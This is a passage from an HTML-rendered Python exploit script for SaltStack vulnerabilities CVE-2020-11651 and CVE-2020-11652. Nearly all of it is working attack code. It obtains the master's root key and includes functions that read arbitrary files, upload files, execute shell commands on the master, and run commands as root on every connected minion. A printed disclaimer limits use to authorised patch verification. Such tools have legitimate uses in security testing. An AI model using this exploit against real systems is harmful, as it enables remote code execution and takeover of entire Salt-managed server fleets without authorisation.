class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;ERROR&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if debug:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(rets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if rets[&#39;data&#39;][&#39;return&#39;].startswith(&#39;Wrote&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.remove(&#39;/tmp/salt_CVE_2020_11652.conf&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except OSError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Maybe?&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;YES&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;NO&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def pwn_read_file(channel, root_key, path, master_ip):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Attemping to read {} from {}&quot;.format(path, master_ip))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;key&#39;: root_key,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;wheel&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;file_roots.read&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;path&#39;: path,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;saltenv&#39;: &#39;base&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(rets[&#39;data&#39;][&#39;return&#39;][0][path])</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def pwn_upload_file(channel, root_key, src, dest, master_ip):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Attemping to upload {} to {} on {}&quot;.format(src, dest, master_ip))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fh = open(src, &#39;rb&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = fh.read()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fh.close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except Exception as e:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Failed to read {}: {}&#39;.format(src, e))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;key&#39;: root_key,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;wheel&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;file_roots.write&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;saltenv&#39;: &#39;base&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data&#39;: payload,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;path&#39;: dest,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;[ ] {}&#39;.format(rets[&#39;data&#39;][&#39;return&#39;]))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def pwn_exec(channel, root_key, cmd, master_ip, jid):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Attemping to execute {} on {}&quot;.format(cmd, master_ip))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;key&#39;: root_key,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;runner&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;salt.cmd&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;saltenv&#39;: &#39;base&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;user&#39;: &#39;sudo_user&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;kwarg&#39;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;cmd.exec_code&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;lang&#39;: &#39;python&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;code&#39;: &quot;import subprocess;subprocess.call(&#39;{}&#39;,shell=True)&quot;.format(cmd)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jid&#39;: jid,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except Exception as e:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Failed to submit job&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if rets.get(&#39;jid&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[+] Successfully scheduled job: {}&#39;.format(rets[&#39;jid&#39;]))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def pwn_exec_all(channel, root_key, cmd, master_ip, jid):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Attemping to execute &#39;{}&#39; on all minions connected to {}&quot;.format(cmd, master_ip))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;key&#39;: root_key,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;_send_pub&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;cmd.run&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;user&#39;: &#39;root&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;arg&#39;: [ &quot;/bin/sh -c &#39;{}&#39;&quot;.format(cmd) ],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;tgt&#39;: &#39;*&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;tgt_type&#39;: &#39;glob&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;ret&#39;: &#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;jid&#39;: jid</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except Exception as e:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Failed to submit job&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;finally:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if rets == None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[+] Successfully submitted job to all minions.&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Failed to submit job&#39;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def main():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser = argparse.ArgumentParser(description=&#39;Saltstack exploit for CVE-2020-11651 and CVE-2020-11652&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--master&#39;, &#39;-m&#39;, dest=&#39;master_ip&#39;, default=&#39;127.0.0.1&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--port&#39;, &#39;-p&#39;, dest=&#39;master_port&#39;, default=&#39;4506&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--force&#39;, &#39;-f&#39;, dest=&#39;force&#39;, default=False, action=&#39;store_false&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--debug&#39;, &#39;-d&#39;, dest=&#39;debug&#39;, default=False, action=&#39;store_true&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--run-checks&#39;, &#39;-c&#39;, dest=&#39;run_checks&#39;, default=False, action=&#39;store_true&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--read&#39;, &#39;-r&#39;, dest=&#39;read_file&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--upload-src&#39;, dest=&#39;upload_src&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--upload-dest&#39;, dest=&#39;upload_dest&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--exec&#39;, dest=&#39;exec&#39;, help=&#39;Run a command on the master&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--exec-all&#39;, dest=&#39;exec_all&#39;, help=&#39;Run a command on all minions&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;args = parser.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;time.sleep(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Both src and destination are required for uploads</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Must provide both --upload-src and --upload-dest&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;channel = init_minion(args.master_ip, args.master_port)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if check_salt_version():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[ ] This version of salt is vulnerable! Check results below&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif args.force:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[*] This version of salt does NOT appear vulnerable. Proceeding anyway as requested.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;check_connection(args.master_ip, args.master_port, channel)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;root_key = check_CVE_2020_11651(channel)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if root_key:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;\n[*] root key obtained: {}&#39;.format(root_key))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Failed to find root key...aborting&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(127)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.run_checks:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Assuming this check runs on the master itself, create a file with &quot;secret&quot; content</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# and abuse CVE-2020-11652 to read it.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;top_secret_file_path = &#39;/tmp/salt_cve_teta&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with salt.utils.fopen(top_secret_file_path, &#39;w&#39;) as fd:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd.write(&quot;top secret&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Again, this assumes we&#39;re running this check on the master itself</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with salt.utils.fopen(&#39;/var/cache/salt/master/.root_key&#39;) as keyfd:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root_key = keyfd.read()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check_CVE_2020_11652_write1(debug, channel, root_key)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check_CVE_2020_11652_write2(debug, channel, root_key)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.remove(top_secret_file_path)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(0)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.read_file:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwn_read_file(channel, root_key, args.read_file, args.master_ip)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.upload_src:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if os.path.isabs(args.upload_dest):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Destination path must be relative; aborting&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;jid = &#39;{0:%Y%m%d%H%M%S%f}&#39;.format(datetime.datetime.utcnow())</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.exec:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwn_exec(channel, root_key, args.exec, args.master_ip, jid)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.exec_all:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[!] Lester, is this what you want? Hit ^C to abort.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;main()</span></p></body>
</html>
